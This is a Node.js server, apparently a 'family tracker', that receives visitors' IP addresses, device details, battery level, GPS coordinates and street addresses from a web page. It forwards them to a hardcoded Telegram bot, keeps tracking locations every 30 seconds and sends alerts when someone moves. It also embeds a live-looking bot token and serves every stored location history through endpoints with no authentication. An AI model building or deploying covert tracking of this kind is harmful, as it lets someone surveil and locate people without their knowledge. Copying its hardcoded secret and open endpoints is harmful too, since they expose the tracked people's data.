const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Start HTTP server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Family Link Tracker is running on port ${PORT}!`);
    if (process.env.PORT) {
        const RENDER_URL = process.env.RENDER_EXTERNAL_URL || `https://localhost:${PORT}`;
        setInterval(() => {
            fetch(RENDER_URL).then(() => console.log('⏰ Keep-alive ping sent'))
                .catch(() => { });
        }, 14 * 60 * 1000);
        console.log('⏰ Keep-alive enabled (ping every 14 min)');
    } else {
        const https = require('https');
        const selfsigned = require('selfsigned');
        const attrs = [{ name: 'commonName', value: 'Family Tracker' }];
        const pems = selfsigned.generate(attrs, { days: 365, keySize: 2048 });
        const HTTPS_PORT = 3443;
        https.createServer({ key: pems.private, cert: pems.cert }, app)
            .listen(HTTPS_PORT, '0.0.0.0', () => {
                console.log(`🔒 HTTPS: https://localhost:${HTTPS_PORT}`);
                console.log(`📱 Phone: https://192.168.137.1:${HTTPS_PORT}`);
            });
    }
    console.log(`📊 Dashboard: /dashboard.html`);
    console.log(`🗺️ Live Map: /map.html`);
    console.log('');
});

// ============================================
// ⚙️ CONFIGURATION
// ============================================
const TELEGRAM_BOT_TOKEN = '8769669312:AAFNb_vouYN_jDT7v0CQuJYx-D6vvYbOZr4';
const TELEGRAM_CHAT_ID = '6812241388';
// ============================================

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// 📦 DATA STORES
// ============================================
const visitorsLog = [];
const liveDevices = {};
const locationHistory = [];

// Generate device ID from IP + UserAgent
function getDeviceId(ip, ua) {
    return crypto.createHash('md5').update(ip + (ua || '')).digest('hex').substring(0, 10);
}

// Get real IP
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.headers['x-real-ip'] ||
        req.connection?.remoteAddress ||
        req.socket?.remoteAddress ||
        'Unknown';
}

// Calculate distance between two GPS points (meters)
function getDistance(lat1, lon1, lat2, lon2) {
    const R = 6371000;
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
        Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
        Math.sin(dLon / 2) * Math.sin(dLon / 2);
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

// ============================================
// 📨 TELEGRAM
// ============================================
async function sendToTelegram(message) {
    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
        });
    } catch (error) {
        console.error('Telegram error:', error.message);
    }
}

async function sendLocationToTelegram(lat, lon) {
    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: lat, longitude: lon })
        });
    } catch (error) {
        console.error('Location send error:', error.message);
    }
}

// ============================================
// 📍 API: First-time data collection
// ============================================
app.post('/api/collect', async (req, res) => {
    const serverIP = getClientIP(req);
    const data = req.body;
    const realIP = data.ipInfo?.ip || serverIP;
    const deviceId = getDeviceId(realIP, data.device?.userAgent);

    const visitorInfo = {
        timestamp: new Date().toISOString(),
        ip: realIP,
        deviceId,
        ...data
    };

    if (visitorInfo.ipInfo) visitorInfo.ipInfo.ip = realIP;
    visitorsLog.push(visitorInfo);

    // Register as live device
    liveDevices[deviceId] = {
        deviceId,
        userName: data.userName || '',
        ip: realIP,
        device: data.device || {},
        ipInfo: data.ipInfo || {},
        gpsLocation: data.gpsLocation || {},
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        isOnline: true
    };

    // Add to location history
    if (data.gpsLocation && data.gpsLocation.lat) {
        locationHistory.push({
            deviceId,
            lat: data.gpsLocation.lat,
            lon: data.gpsLocation.lon,
            accuracy: data.gpsLocation.accuracy,
            city: data.gpsLocation.city,
            fullAddress: data.gpsLocation.fullAddress,
            timestamp: new Date().toISOString()
        });
    }

    // Telegram notification
    const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Amman' });
    let message = `🔔 <b>📍 جهاز جديد متصل!</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `🕐 <b>الوقت:</b> ${now}\n`;
    if (data.userName) message += `👤 <b>الاسم:</b> ${data.userName}\n`;
    message += `🆔 <b>معرّف:</b> <code>${deviceId}</code>\n`;
    message += `🌐 <b>IP:</b> <code>${realIP}</code>\n`;

    if (data.gpsLocation && data.gpsLocation.lat) {
        message += `\n🎯 <b>الموقع الدقيق (GPS):</b>\n`;
        message += `   📍 المدينة: ${data.gpsLocation.city || 'غير معروف'}\n`;
        if (data.gpsLocation.district) message += `   🏘️ الحي: ${data.gpsLocation.district}\n`;
        if (data.gpsLocation.road) message += `   🛣️ الشارع: ${data.gpsLocation.road}\n`;
        if (data.gpsLocation.state) message += `   🗺️ المحافظة: ${data.gpsLocation.state}\n`;
        message += `   🌍 الدولة: ${data.gpsLocation.country || 'غير معروف'}\n`;
        message += `   🎯 الدقة: ${data.gpsLocation.accuracy || '?'}\n`;
        message += `   📐 الإحداثيات: <code>${data.gpsLocation.lat}, ${data.gpsLocation.lon}</code>\n`;
        if (data.gpsLocation.fullAddress) message += `   🏠 العنوان: ${data.gpsLocation.fullAddress}\n`;
        message += `   🗺️ خريطة: https://www.google.com/maps?q=${data.gpsLocation.lat},${data.gpsLocation.lon}\n`;
    } else if (data.ipInfo) {
        message += `\n📍 <b>الموقع التقريبي (IP):</b>\n`;
        message += `   🏙️ المدينة: ${data.ipInfo.city || 'غير معروف'}\n`;
        message += `   🌍 الدولة: ${data.ipInfo.country || 'غير معروف'}\n`;
    }

    if (data.ipInfo) {
        message += `\n🌐 <b>الشبكة:</b> ${data.ipInfo.isp || 'غير معروف'}\n`;
    }

    if (data.device) {
        message += `\n📱 <b>الجهاز:</b>\n`;
        if (data.device.model) message += `   📲 ${data.device.model}\n`;
        message += `   💻 ${data.device.platform || data.device.os || '?'} | ${data.device.browserFull || data.device.browser || '?'}\n`;
        message += `   🔋 ${data.device.battery || '?'}${data.device.charging === 'نعم' ? ' ⚡' : ''}\n`;
    }

    message += `\n🔴 <b>التتبع المباشر مفعّل</b>\n━━━━━━━━━━━━━━━━━━`;

    await sendToTelegram(message);

    if (data.gpsLocation?.lat && data.gpsLocation?.lon) {
        await sendLocationToTelegram(data.gpsLocation.lat, data.gpsLocation.lon);
    }

    console.log(`📋 New device: ${deviceId} | ${data.device?.model || 'Unknown'} | ${data.gpsLocation?.city || 'No GPS'}`);
    res.json({ status: 'ok', deviceId });
});

// ============================================
// 📡 API: Live tracking updates (every 30s)
// ============================================
app.post('/api/track', async (req, res) => {
    const serverIP = getClientIP(req);
    const { deviceId, lat, lon, accuracy, speed, altitude } = req.body;

    if (!deviceId || !lat || !lon) {
        return res.json({ status: 'error', msg: 'missing data' });
    }

    const now = new Date().toISOString();
    locationHistory.push({ deviceId, lat, lon, accuracy, speed, timestamp: now });

    // Keep history manageable
    if (locationHistory.length > 5000) locationHistory.splice(0, locationHistory.length - 5000);

    // Update live device & check movement
    if (liveDevices[deviceId]) {
        const prev = liveDevices[deviceId].gpsLocation;

        if (prev && prev.lat && prev.lon) {
            const dist = getDistance(prev.lat, prev.lon, lat, lon);
            if (dist > 500) {
                const deviceName = liveDevices[deviceId].device?.model || deviceId;
                const timeStr = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Amman' });
                let alert = `🚨 <b>تنبيه حركة!</b>\n`;
                alert += `📱 ${deviceName}\n`;
                alert += `📏 تحرك ${Math.round(dist)}م\n`;
                alert += `🕐 ${timeStr}\n`;
                alert += `📍 https://www.google.com/maps?q=${lat},${lon}`;
                await sendToTelegram(alert);
                await sendLocationToTelegram(lat, lon);
            }
        }

        liveDevices[deviceId].gpsLocation = { lat, lon, accuracy, speed, altitude };
        liveDevices[deviceId].lastSeen = now;
        liveDevices[deviceId].isOnline = true;
    }

    res.json({ status: 'ok' });
});

// ============================================
// 📊 API: Get all live devices
// ============================================
app.get('/api/devices', (req, res) => {
    const now = Date.now();
    const devices = Object.values(liveDevices).map(d => {
        const lastSeen = new Date(d.lastSeen).getTime();
        const diffMin = (now - lastSeen) / 60000;
        return {
            ...d,
            isOnline: diffMin < 2,
            isRecent: diffMin < 5,
            minutesAgo: Math.round(diffMin)
        };
    });
    res.json(devices);
});

// ============================================
// 📜 API: Location history for a device
// ============================================
app.get('/api/history/:deviceId', (req, res) => {
    const history = locationHistory
        .filter(h => h.deviceId === req.params.deviceId)
        .slice(-100);
    res.json(history);
});

// ============================================
// 📋 API: All visitors (dashboard)
// ============================================
app.get('/api/visitors', (req, res) => {
    res.json(visitorsLog);
});

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
